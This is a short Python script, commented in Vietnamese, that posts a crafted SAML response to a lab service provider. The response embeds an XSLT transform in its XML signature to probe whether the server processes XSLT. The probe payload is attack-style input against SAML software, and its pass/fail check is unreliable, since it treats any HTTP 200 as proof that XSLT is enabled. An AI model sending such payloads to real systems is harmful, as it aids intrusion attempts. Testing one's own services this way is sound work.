#!/usr/bin/env python3
import requests
import base64

SP_ACS_URL = "http://172.20.0.20/saml/acs"

def verify_xslt():
    print("[*] Đang kiểm tra cấu hình XSLT Transform trên SP-App...")
    
    # Gói tin chèn thêm thẻ Transform chứa Namespace XSLT để thăm dò hệ thống
    probe_payload = """<?xml version="1.0" encoding="UTF-8"?>
    <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml:Assertion>
            <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                <ds:SignedInfo>
                    <ds:Reference URI="">
                        <ds:Transforms>
                            <!-- Thẻ thăm dò: Nếu server chấp nhận Namespace này, hệ thống đang gặp rủi ro -->
                            <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
                                <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
                                    <xsl:template match="/">
                                        <WARNING>XSLT_IS_ENABLED</WARNING>
                                    </xsl:template>
                                </xsl:stylesheet>
                            </ds:Transform>
                        </ds:Transforms>
                    </ds:Reference>
                </ds:SignedInfo>
            </ds:Signature>
        </saml:Assertion>
    </samlp:Response>"""
    
    encoded_saml = base64.b64encode(probe_payload.encode()).decode()
    
    try:
        response = requests.post(SP_ACS_URL, data={"SAMLResponse": encoded_saml})
        if "XSLT_IS_ENABLED" in response.text or response.status_code == 200:
            print("[!] CẢNH BÁO: SP-App đang cho phép xử lý XSLT (Rủi ro cấu hình).")
        else:
            print("[-] Hệ thống an toàn: Tính năng XSLT đã bị chặn.")
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")

if __name__ == "__main__":
    verify_xslt()
